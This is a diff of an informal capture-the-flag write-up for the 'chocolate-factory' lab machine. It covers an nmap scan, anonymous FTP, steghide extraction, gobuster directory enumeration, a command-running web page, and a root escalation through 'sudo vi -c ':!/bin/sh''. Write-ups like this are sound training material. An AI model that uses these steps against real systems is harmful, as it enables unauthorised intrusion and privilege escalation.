@@ -6,41 +6,68 @@ first we scan the machine using nmap using the command: nmap -sV [IP HERE]
 nmap scan:
 
 21/tcp  open  ftp        vsftpd 3.0.3
+
 22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
 80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
+
 100/tcp open  newacct?
+
 106/tcp open  pop3pw?
+
 109/tcp open  pop2?
+
 110/tcp open  pop3?
+
 111/tcp open  rpcbind?
+
 113/tcp open  ident?
+
 119/tcp open  nntp?
+
 125/tcp open  locus-map?
 
 
 we login to ftp using username: "anonymous" and password: "anonymous"
 
-ftp found "gum_room.jpg", used steghide to extract it: "steghide extract -sf gum_room.jpg"
+ftp found "gum_room.jpg"
+
+used steghide to extract it: "steghide extract -sf gum_room.jpg"
+
 didnt put passphrase, b64.txt extracterd.
+
 found what looks like a /etc/shadow file. didnt find anything usefull.
 
 we open the webpage and find a login portal.
+
 i used gobuster to enumrate directories.
+
 "gobuster dir -u http://[IP HERE] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html"
+
 gobuster: the name of the tool.
+
 dir: specify we want to bruteforce directiories.
+
 -u: specify the url
+
 -w: specify the world list
+
 -x: look for filees with exstinsions.
 
 result: 
 
 /.php                 (Status: 403) [Size: 278]
+
 /.html                (Status: 403) [Size: 278]
+
 /index.html           (Status: 200) [Size: 1466]
+
 /home.php             (Status: 200) [Size: 569]
+
 /validate.php         (Status: 200) [Size: 93]
+
 /.php                 (Status: 403) [Size: 278]
+
 /.html                (Status: 403) [Size: 278]
 
 we navigat to home.php, you can run commands in it.
@@ -104,16 +131,22 @@ in charlie, i tried "sudo -l"
 result:
 
 Matching Defaults entries for charlie on chocolate-factory:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+   env_reset, mail_badpass,
+   
+   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User charlie may run the following commands on chocolate-factory:
-    (ALL : !root) NOPASSWD: /usr/bin/vi
+    
+   (ALL : !root) NOPASSWD: /usr/bin/vi
+
 
 
 in gtfobins, vi -c ':!/bin/sh' /dev/null
+
 tried run "sudo vi -c ':!/bin/sh' /dev/null"
+
 charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
+
 pwned!!
 
 root flag:
